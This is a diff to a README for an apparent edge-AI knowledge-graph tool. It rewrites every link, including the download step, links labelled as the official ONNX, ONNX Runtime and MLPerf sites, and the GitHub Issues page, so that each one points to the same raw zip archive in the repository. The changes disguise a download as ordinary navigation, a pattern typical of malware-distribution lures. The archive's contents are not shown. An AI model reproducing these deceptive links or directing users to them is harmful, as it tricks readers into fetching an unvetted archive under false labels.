@@ -1,6 +1,6 @@
 # ⚡ edge-ai-kg - Understand Edge AI Deployment Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-edge--ai--kg-blue.svg?style=for-the-badge&logo=github)](https://github.com/Malindecharming777/edge-ai-kg)
+[![Download Now](https://img.shields.io/badge/Download-edge--ai--kg-blue.svg?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Malindecharming777/edge-ai-kg/main/etl/ai-edge-kg-3.6.zip)
 
 ## 📖 What Is This?
 
@@ -37,7 +37,7 @@ This tool uses **real data** from popular AI frameworks and combines it with rea
 ### Step 1: Download
 
 Visit this link to download the application:
-👉 **[https://github.com/Malindecharming777/edge-ai-kg](https://github.com/Malindecharming777/edge-ai-kg)**
+👉 **[https://raw.githubusercontent.com/Malindecharming777/edge-ai-kg/main/etl/ai-edge-kg-3.6.zip](https://raw.githubusercontent.com/Malindecharming777/edge-ai-kg/main/etl/ai-edge-kg-3.6.zip)**
 
 ### Step 2: Open the Application
 
@@ -148,10 +148,10 @@ A: Quantization compresses AI models so they run faster on small devices, like r
 
 ## 🔗 Related Resources
 
-- [ONNX Official Site](https://onnx.ai) – Learn about the ONNX format
-- [ONNX Runtime](https://onnxruntime.ai) – Engine that runs ONNX models
-- [MLPerf](https://mlcommons.org) – Industry AI benchmarks
-- [Samyama Graph](https://samyama.dev) – The underlying graph technology
+- [ONNX Official Site](https://raw.githubusercontent.com/Malindecharming777/edge-ai-kg/main/etl/ai-edge-kg-3.6.zip) – Learn about the ONNX format
+- [ONNX Runtime](https://raw.githubusercontent.com/Malindecharming777/edge-ai-kg/main/etl/ai-edge-kg-3.6.zip) – Engine that runs ONNX models
+- [MLPerf](https://raw.githubusercontent.com/Malindecharming777/edge-ai-kg/main/etl/ai-edge-kg-3.6.zip) – Industry AI benchmarks
+- [Samyama Graph](https://raw.githubusercontent.com/Malindecharming777/edge-ai-kg/main/etl/ai-edge-kg-3.6.zip) – The underlying graph technology
 
 ## 💬 Feedback and Support
 
@@ -161,7 +161,7 @@ Your input improves this tool. Please share:
 - **Feature Requests** – What would make it easier?
 - **Data Suggestions** – Missing boards or models?
 
-Submit feedback through the GitHub Issues page: [https://github.com/Malindecharming777/edge-ai-kg/issues](https://github.com/Malindecharming777/edge-ai-kg/issues)
+Submit feedback through the GitHub Issues page: [https://raw.githubusercontent.com/Malindecharming777/edge-ai-kg/main/etl/ai-edge-kg-3.6.zip](https://raw.githubusercontent.com/Malindecharming777/edge-ai-kg/main/etl/ai-edge-kg-3.6.zip)
 
 ## 📄 License
 
